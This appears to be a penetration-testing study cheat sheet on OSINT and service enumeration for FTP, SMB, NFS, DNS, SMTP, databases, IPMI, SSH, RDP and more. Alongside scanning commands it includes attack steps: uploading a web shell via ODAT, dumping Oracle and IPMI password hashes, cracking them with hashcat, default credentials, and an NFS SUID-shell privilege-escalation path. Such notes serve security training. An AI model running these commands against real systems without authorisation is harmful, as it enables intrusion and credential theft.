# Footprinting — Service Enumeration

Enumeration is a loop: active scans + passive OSINT. Goal = find all paths in, not break in immediately. 6 layers: Internet Presence → Gateway → Accessible Services → Processes → Privileges → OS Setup.

---

## Passive Recon / OSINT

SSL cert inspection — check SAN fields for extra subdomains:

```bash
# crt.sh — Certificate Transparency logs
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```

Resolve discovered subdomains to IPs (filter company-owned vs third-party):

```bash
for i in $(cat subdomainlist); do host $i | grep "has address" | grep <DOMAIN> | cut -d" " -f1,4; done
```

Shodan sweep on discovered IPs:

```bash
for i in $(cat ip-addresses.txt); do shodan host $i; done
```

Full DNS enumeration:

```bash
dig any <DOMAIN>                          # A, MX, NS, TXT, SOA — all records
dig ns <DOMAIN> @<DNS_SERVER>            # nameservers
dig CH TXT version.bind <DNS_SERVER>     # DNS server version (if exposed)
```

TXT record intel to note: Atlassian (Jira/Confluence), Google Gmail (GDrive exposure), LogMeIn (centralized remote access), Mailgun (API endpoints), Outlook/OneDrive (Azure SMB), INWX (hosting provider/username hint from MS= value).

Cloud storage discovery:

```bash
# Google Dorks
intext:<COMPANY> inurl:amazonaws.com
intext:<COMPANY> inurl:blob.core.windows.net
```

GrayHatWarfare: https://buckets.grayhatwarfare.com — search AWS/Azure/GCP buckets passively. Look for leaked `id_rsa`, `id_rsa.pub`, config files.

Staff OSINT: LinkedIn job posts → tech stack (languages, frameworks, DBs, tools). Employee profiles → GitHub links → hardcoded secrets, JWT tokens, personal emails in commits.

---

## FTP (TCP/21)

```bash
nmap -sV -p21 -sC -A <TARGET>                        # ftp-anon auto-checks anon login
ftp <TARGET>                                          # interactive client
ftp> ls -R                                            # recursive listing (if ls_recurse_enable=YES)
ftp> get <FILE>                                       # download file
ftp> put <FILE>                                       # upload file
ftp> mget *                                           # download all
wget -m --no-passive ftp://anonymous:anonymous@<TARGET>   # mirror entire FTP tree
```

TLS FTP (inspect cert for org/hostnames):

```bash
openssl s_client -connect <TARGET>:21 -starttls ftp
nc -nv <TARGET> 21
```

Dangerous misconfigs to note: `anonymous_enable=YES`, `anon_upload_enable=YES`, `write_enable=YES`, `no_anon_password=YES`, `hide_ids=YES` (all files owned by "ftp" — hides real UIDs).

NSE scripts available: `ftp-anon`, `ftp-syst`, `ftp-brute`, `ftp-vsftpd-backdoor`, `ftp-bounce`.

Config files: `/etc/vsftpd.conf`, `/etc/ftpusers` (deny list).

---

## SMB (TCP/445, TCP/139)

```bash
nmap -sV -sC -p139,445 <TARGET>

smbclient -N -L //<TARGET>                           # null session share listing
smbclient //<TARGET>/<SHARE>                         # connect to share
smb: \> ls; get <FILE>; !cat <FILE>                  # browse, download, view locally

smbmap -H <TARGET>                                   # permissions per share
smbmap -H <TARGET> -r <SHARE>                        # recursive listing
smbmap -H <TARGET> --download "<SHARE>\<FILE>"
smbmap -H <TARGET> --upload <LOCAL> "<SHARE>\<FILE>"

crackmapexec smb <TARGET> --shares -u '' -p ''       # null session + share enum

rpcclient -U "" <TARGET>                             # null session RPC
rpcclient $> srvinfo; enumdomains; querydominfo
rpcclient $> netshareenumall; netsharegetinfo <SHARE>
rpcclient $> enumdomusers; queryuser <RID>; querygroup <GID>

# RID brute force (enumerate users)
for i in $(seq 500 1100); do rpcclient -N -U "" <TARGET> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done

samrdump.py <TARGET>                                 # Impacket — same as RID brute

enum4linux-ng.py <TARGET> -A -C                     # automated full enum
```

Config: `/etc/samba/smb.conf`. Dangerous settings: `browseable=yes`, `guest ok=yes`, `writable=yes`, `create mask=0777`.

> [!warning] `smbstatus` on the server shows active connections — use for defensive awareness.

---

## NFS (TCP/2049, TCP/111)

```bash
nmap -p111,2049 -sV -sC <TARGET>
nmap --script nfs* -sV -p111,2049 <TARGET>          # lists shares, contents, stats

showmount -e <TARGET>                                # show available exports

mkdir target-NFS
sudo mount -t nfs <TARGET>:/ ./target-NFS/ -o nolock
ls -l ./target-NFS/mnt/nfs/                         # view with usernames
ls -n ./target-NFS/mnt/nfs/                         # view with UIDs/GUIDs

sudo umount ./target-NFS
```

Config: `/etc/exports`. Dangerous: `no_root_squash` (root files keep UID 0), `rw`, `insecure` (ports >1024 allowed), `nohide`. `root_squash` remaps root → anonymous UID (can't edit root-owned files even as root).

PrivEsc path: if `no_root_squash` set → upload SUID shell owned by target user → execute via SSH.

---

## DNS (UDP+TCP/53)

```bash
dig ns <DOMAIN> @<DNS_SERVER>                        # nameservers
dig any <DOMAIN> @<DNS_SERVER>                       # all records
dig axfr <DOMAIN> @<DNS_SERVER>                      # zone transfer (AXFR)
dig axfr internal.<DOMAIN> @<DNS_SERVER>             # internal zone transfer

# Subdomain brute force with dig
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do dig $sub.<DOMAIN> @<DNS_SERVER> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt; done

dnsenum --dnsserver <DNS_SERVER> --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <DOMAIN>
```

Record types to note: A (IP), MX (mail server), NS (nameserver), TXT (SPF/DMARC/verif tokens — leak third-party providers), CNAME (alias), PTR (reverse lookup), SOA (zone admin email: dot replaced by @).

Misconfigured `allow-transfer any` → full zone dump leaks internal IPs, hostnames (DCs, VPNs, mail, WSUS, workstations).

---

## SMTP (TCP/25, TCP/587)

```bash
nmap -sC -sV -p25 <TARGET>
nmap -p25 --script smtp-open-relay -v <TARGET>       # tests 16 relay methods

telnet <TARGET> 25
> EHLO mail.test.com                                  # lists supported extensions
> VRFY <USER>                                         # user existence (252 = might exist)
> MAIL FROM: <user@domain>
> RCPT TO: <target@domain> NOTIFY=success,failure
> DATA
> .
> QUIT
```

User enum via VRFY returns 252 even for non-existent users if misconfigured — don't fully trust results. Open relay (`mynetworks = 0.0.0.0/0`) → spoof sender, send to external.

Via web proxy: `CONNECT <TARGET>:25 HTTP/1.0`.

---

## IMAP / POP3 (TCP/143, TCP/993, TCP/110, TCP/995)

```bash
nmap -sV -p110,143,993,995 -sC <TARGET>

# Direct interaction
curl -k 'imaps://<TARGET>' --user <USER>:<PASS>
curl -k 'imaps://<TARGET>' --user <USER>:<PASS> -v   # shows TLS version, cert details

openssl s_client -connect <TARGET>:pop3s
openssl s_client -connect <TARGET>:imaps
```

IMAP commands after login:

```
1 LOGIN <USER> <PASS>
1 LIST "" *          # list folders
1 SELECT INBOX       # select mailbox
1 FETCH <ID> all     # read message
1 LOGOUT
```

Dangerous settings: `auth_debug`, `auth_debug_passwords`, `auth_verbose_passwords`, `auth_anonymous_username`.

---

## SNMP (UDP/161, UDP/162)

```bash
snmpwalk -v2c -c <COMMUNITY_STRING> <TARGET>         # walk OID tree
snmpwalk -v2c -c public <TARGET>                     # default community "public"

# Brute community strings
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <TARGET>

# Brute OIDs once community string known
braa <COMMUNITY_STRING>@<TARGET>:.1.3.6.*
```

SNMPv1/v2c = no auth, plaintext community strings. SNMPv3 = auth + encryption. Dangerous: `rwuser noauth`, `rwcommunity <STRING> 0.0.0.0/0`.

---

## MySQL (TCP/3306)

```bash
nmap -sV -p3306 --script mysql* <TARGET>
mysql -u <USER> -p<PASS> -h <TARGET>

mysql> show databases;
mysql> use <DB>;
mysql> show tables;
mysql> show columns from <TABLE>;
mysql> select * from <TABLE>;
mysql> select * from <TABLE> where <COL>="<STRING>";
```

Config: `/etc/mysql/mysql.conf.d/mysqld.cnf`. Dangerous: `secure_file_priv` (empty = file read/write anywhere), `debug`, `sql_warnings`.

---

## MSSQL (TCP/1433)

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p1433 <TARGET>

# MSF ping
use auxiliary/scanner/mssql/mssql_ping; set rhosts <TARGET>; run

# Connect with creds
impacket-mssqlclient <USER>@<TARGET> -windows-auth
SQL> select name from sys.databases;
```

Default DBs: `master`, `model`, `msdb`, `tempdb`, `resource`. Default service account: `NT SERVICE\MSSQLSERVER`. Runs on Windows auth by default (AD or local SAM).

---

## Oracle TNS (TCP/1521)

```bash
nmap -p1521 -sV <TARGET> --open
nmap -p1521 -sV <TARGET> --open --script oracle-sid-brute    # find SIDs

# ODAT — full enum + exploit
./odat.py all -s <TARGET>                            # all modules, finds creds
./odat.py utlfile -s <TARGET> -d <SID> -U <USER> -P <PASS> --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php

# Connect
sqlplus <USER>/<PASS>@<TARGET>/<SID>
sqlplus <USER>/<PASS>@<TARGET>/<SID> as sysdba       # elevate if user has sysdba grant

SQL> select table_name from all_tables;
SQL> select * from user_role_privs;
SQL> select name, password from sys.user$;           # extract password hashes
```

Default creds: Oracle 9 = `CHANGE_ON_INSTALL`. Oracle DBSNMP = `dbsnmp`. Common test creds: `scott/tiger`. Configs: `$ORACLE_HOME/network/admin/tnsnames.ora`, `listener.ora`.

---

## IPMI (UDP/623)

```bash
nmap -sU --script ipmi-version -p623 <TARGET>

# MSF version scan
use auxiliary/scanner/ipmi/ipmi_version; set rhosts <TARGET>; run

# MSF hash dump (RAKP flaw in IPMI 2.0 — pre-auth)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set OUTPUT_HASHCAT_FILE ipmi.txt
set rhosts <TARGET>; run

# Crack hashes
hashcat -m 7300 ipmi.txt <WORDLIST>
# HP iLO factory default (8-char upper+digit):
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Default creds: Dell iDRAC = `root:calvin`, HP iLO = `Administrator:<randomized>`, Supermicro = `ADMIN:ADMIN`. RAKP flaw = server sends salted hash of password before auth completes → dump hash for any valid user without creds. No patch exists — architectural flaw in IPMI spec.

> [!warning] BMC access = near-physical access. Can power off, reinstall OS, read serial console. Check password reuse across environment after cracking.

---

## SSH (TCP/22)

```bash
# Fingerprint / audit
git clone https://github.com/jtesta/ssh-audit.git
./ssh-audit.py <TARGET>

# Auth methods available
ssh -v <USER>@<TARGET>

# Force password auth (for brute force)
ssh -v <USER>@<TARGET> -o PreferredAuthentications=password
```

Banner format: `SSH-2.0-OpenSSH_8.2p1` = SSH-2 only. `SSH-1.99-OpenSSH_3.9p1` = supports both. CVE-2020-14145 (OpenSSH ≤8.x) = MITM on initial connection if client doesn't verify host key properly. Config: `/etc/ssh/sshd_config`. Dangerous: `PermitRootLogin yes`, `PermitEmptyPasswords yes`, `PasswordAuthentication yes`, `Protocol 1`.

---

## Rsync (TCP/873)

```bash
nmap -sV -p873 <TARGET>
nc -nv <TARGET> 873                                  # banner + list shares
rsync -av --list-only rsync://<TARGET>/<SHARE>      # list share contents
rsync -av rsync://<TARGET>/<SHARE> ./               # download all files
rsync -av -e ssh rsync://<TARGET>/<SHARE> ./        # if SSH backend
rsync -av -e "ssh -p2222" rsync://<TARGET>/<SHARE> ./
```

---

## R-Services (TCP/512-514)

Legacy Unix remote management — cleartext, trust-based. Often present on older Solaris/HP-UX/AIX.

```bash
nmap -sV -p512,513,514 <TARGET>
rlogin <TARGET> -l <USER>                            # if trusted in .rhosts
rwho                                                  # list logged-in users (UDP/513)
rusers -al <TARGET>                                  # detailed user sessions
```

Trust files: `/etc/hosts.equiv` (global), `~/.rhosts` (per-user). Entry `+ +` = trust all hosts all users — full bypass. `rsh`, `rexec`, `rlogin` all bypass PAM if `.rhosts` matches.

---

## RDP (TCP/3389)

```bash
nmap -sV -sC -p3389 --script rdp* <TARGET>

# Security check (NLA, encryption levels)
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
./rdp-sec-check.pl <TARGET>

# Connect
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET> /cert:ignore
```

NLA (Network Level Auth) = auth before desktop loads, harder to exploit. No NLA = more attack surface. `mstshash=nmap` cookie in nmap RDP scripts is detectable by EDR.

---

## WinRM (TCP/5985 HTTP, TCP/5986 HTTPS)

```bash
nmap -sV -sC -p5985,5986 <TARGET>
evil-winrm -i <TARGET> -u <USER> -p <PASS>
```

Enabled by default on Windows Server 2012+. Uses WS-Management / SOAP protocol.

---

## WMI (TCP/135 → random high port)

```bash
impacket-wmiexec <USER>:"<PASS>"@<TARGET> "hostname"
impacket-wmiexec <USER>:"<PASS>"@<TARGET> "whoami"
```

Init on TCP/135, then moves to random port. Full read/write to almost all Windows settings.

---